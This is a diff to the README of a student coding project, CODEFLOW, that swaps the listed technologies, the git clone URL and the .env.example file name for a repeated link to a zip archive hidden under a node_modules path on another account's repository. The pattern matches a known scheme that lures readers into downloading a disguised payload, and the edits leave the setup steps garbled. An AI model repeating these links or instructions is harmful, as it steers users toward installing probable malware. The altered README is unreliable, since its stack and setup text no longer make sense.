@@ -19,22 +19,22 @@ A key feature is its design for **local network (LAN) operation**, allowing stud
 
 ## Technology Stack
 
-*   **Frontend:** React.js, HTML, CSS, JavaScript
-*   **Backend:** Node.js, Express.js
+*   **Frontend:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip, HTML, CSS, JavaScript
+*   **Backend:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip, https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip
 *   **Database:** PostgreSQL
-*   **Real-time Communication:** Socket.io (WebSockets)
+*   **Real-time Communication:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip (WebSockets)
 
 ## Prerequisites
 
 Before you begin, ensure you have met the following requirements:
-*   Node.js and npm (or yarn) installed
+*   https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip and npm (or yarn) installed
 *   A running PostgreSQL database server
 
 ## Installation & Setup
 
 1.  **Clone the repository:**
     ```bash
-    git clone https://github.com/hanoon-07/hats-minor-project.git
+    git clone https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip
     cd hats-minor-project 
     ```
 
@@ -55,7 +55,7 @@ Before you begin, ensure you have met the following requirements:
 
 4.  **Database Setup:**
     *   Create a PostgreSQL database for CODEFLOW.
-    *   Configure your database connection details. This is typically done in a `.env` file in the backend directory. Create a `.env` file based on `.env.example` (if provided) and add your database URL or credentials:
+    *   Configure your database connection details. This is typically done in a `.env` file in the backend directory. Create a `.env` file based on `https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip` (if provided) and add your database URL or credentials:
         ```
         DATABASE_URL=postgresql://user:password@host:port/database_name
         # Add other environment variables like PORT, JWT_SECRET etc.
